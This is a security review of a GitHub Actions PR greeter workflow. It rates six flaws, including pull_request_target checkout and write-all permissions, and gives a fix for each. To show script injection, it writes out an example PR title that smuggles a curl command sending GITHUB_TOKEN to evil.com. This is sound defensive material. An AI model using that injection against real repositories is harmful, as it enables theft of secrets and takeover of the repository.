# Security Review: PR Greeter Workflow

## Critical Issues

### 1. `pull_request_target` with checkout of PR head (Critical - Code Execution)

**Lines affected:** trigger + checkout step

```yaml
on: pull_request_target
# ...
- uses: actions/checkout@v4
  with:
    ref: ${{ github.event.pull_request.head.sha }}
```

`pull_request_target` runs in the context of the **base** repository with full access to secrets and write permissions. By checking out the PR head SHA, the workflow executes arbitrary code from a fork in this privileged context. An attacker can submit a PR with a malicious modified workflow, script, or Makefile and it will run with full repository access. This is the single most dangerous pattern in GitHub Actions.

**Fix:** Use the `pull_request` trigger instead, or avoid checking out untrusted code when using `pull_request_target`. If you must use `pull_request_target` (e.g., to comment on PRs from forks), do not checkout the PR head code. If checkout is necessary, run it in an isolated job with no secrets, then pass only verified data to a privileged job via artifacts.

---

### 2. Overly permissive `permissions: write-all` (High)

**Line affected:** `permissions: write-all`

This grants the `GITHUB_TOKEN` every available write scope: contents, packages, deployments, actions, issues, pull-requests, and more. A greeting workflow only needs `pull-requests: write` at most. Granting excessive permissions violates the principle of least privilege and amplifies the impact of any other vulnerability.

**Fix:**

```yaml
permissions:
  pull-requests: write
```

---

### 3. Script injection via unsanitized PR title (High)

**Line affected:**

```yaml
- run: echo "Hello ${{ github.event.pull_request.title }}! Thanks for contributing."
```

The PR title is user-controlled input interpolated directly into a shell command. An attacker can set the PR title to something like:

```
"; curl https://evil.com/exfil?token=$GITHUB_TOKEN; echo "
```

This results in arbitrary command execution. Combined with `pull_request_target` and `write-all` permissions, an attacker can exfiltrate secrets, push malicious code, or compromise the repository.

**Fix:** Pass the value through an environment variable so the shell treats it as data, not code:

```yaml
- run: echo "Hello ${PR_TITLE}! Thanks for contributing."
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

---

### 4. Unpinned third-party action using mutable `@main` tag (Medium)

**Line affected:**

```yaml
- uses: some-org/post-comment@main
```

Referencing an action by a branch name (`@main`) means the action code can change at any time without your knowledge. If `some-org/post-comment` is compromised or a maintainer pushes a malicious commit, your workflow will silently execute it with access to your `GITHUB_TOKEN` and all its `write-all` permissions.

**Fix:** Pin the action to a specific full-length commit SHA:

```yaml
- uses: some-org/post-comment@<full-sha-hash>  # v1.2.3
```

Use Dependabot or Renovate to keep pinned actions up to date.

---

### 5. Self-hosted / custom runner (`arc-runner-set`) (Medium)

**Line affected:**

```yaml
runs-on: arc-runner-set
```

This workflow runs on a custom ARC (Actions Runner Controller) runner set rather than a GitHub-hosted runner. Running untrusted PR code on self-hosted infrastructure is risky because:

- Self-hosted runners may not be ephemeral, allowing persistence between jobs.
- An attacker running code via the `pull_request_target` + checkout vector could compromise the runner host, access the network, or install backdoors that affect future jobs.

**Fix:** Use GitHub-hosted runners (e.g., `ubuntu-latest`) for workflows that process untrusted input. If self-hosted runners are required, ensure they are ephemeral (destroyed after each job) and network-isolated.

---

### 6. Potential script injection via `user.login` in action input (Low-Medium)

**Line affected:**

```yaml
body: "Welcome ${{ github.event.pull_request.user.login }}!"
```

While GitHub usernames have character restrictions that limit exploitability, interpolating user-controlled data into action inputs is still a bad practice. Depending on how `some-org/post-comment` processes the `body` input, it could lead to injection in API calls or rendered markdown.

**Fix:** Pass through an environment variable or use GitHub's built-in actions (e.g., `actions/github-script`) where you can sanitize inputs programmatically.

---

## Summary

| # | Issue | Severity | Category |
|---|-------|----------|----------|
| 1 | `pull_request_target` + checkout of PR head | Critical | Code execution |
| 2 | `permissions: write-all` | High | Excessive permissions |
| 3 | PR title script injection in `run` step | High | Script injection |
| 4 | Unpinned third-party action on `@main` | Medium | Supply chain |
| 5 | Self-hosted runner with untrusted code | Medium | Infrastructure |
| 6 | User login interpolation in action input | Low-Medium | Script injection |

## Recommended Remediation

The combination of issues 1, 2, and 3 is especially dangerous: an attacker can fork the repository, submit a PR with a malicious title, and gain arbitrary code execution with full write access to the repository and all its secrets. This should be treated as an urgent fix.

1. Replace `pull_request_target` with `pull_request` if the workflow does not need write access to the base repo.
2. If `pull_request_target` is required, never checkout `github.event.pull_request.head.sha`.
3. Scope permissions to the minimum required (`pull-requests: write`).
4. Use environment variables for all user-controlled data in `run` steps.
5. Pin third-party actions to commit SHAs.
6. Use ephemeral GitHub-hosted runners or hardened ephemeral self-hosted runners.
